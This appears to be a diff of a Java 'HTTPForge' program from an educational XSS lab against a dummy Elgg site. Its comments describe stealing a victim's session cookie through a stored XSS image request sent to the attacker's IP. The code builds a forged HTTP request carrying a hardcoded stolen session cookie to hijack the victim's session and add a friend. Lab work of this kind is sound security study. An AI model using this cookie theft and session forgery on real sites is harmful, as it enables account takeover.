@@ -1,3 +1,7 @@
+//A dummy social networking site www.xsslabelgg.com was used to perform a stored XSS attack in this case. 
+//The first part of this XSS attack was to steal the victim's session cookie using a simple script on the attacker's profile page that would request for an image.
+//This script would generate a GET request that would be sent to the image source. The source in turn would be the attacker's IP address and port number. The attacker's machine was to be configured to listen for this communication with an simple server.
+//The next step was to forge a GET request that would use the cookie obtained previously to take over the the victim's session and perform an action which in this case is adding a friend.   
 import java.io.*;
 import java.net.*;
 public class HTTPForge {
@@ -19,8 +23,6 @@ public class HTTPForge {
 		}
 // addRequestProperty method is used to add HTTP Header Information.
 // Here we add User-Agent HTTP header to the forged HTTP packet.
-// Add other necessary HTTP Headers yourself. Cookies should be stolen
-// using the method in task3
 		urlConn.addRequestProperty("Host","www.xsslabelgg.com");
 		urlConn.addRequestProperty("User-agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
 		urlConn.addRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
@@ -30,7 +32,6 @@ public class HTTPForge {
 		urlConn.addRequestProperty("Cookie","Elgg=3ssipeul17vrpe0pfft7s4eif5");
 		urlConn.addRequestProperty("Connection","keep-alive");
 //HTTP Post Data which includes the information to be sent to the server.
-//String data = "name=...&guid=..";
 // DoOutput flag of URL Connection should be set to true
 // to send HTTP POST message.
 		urlConn.setDoOutput(true);
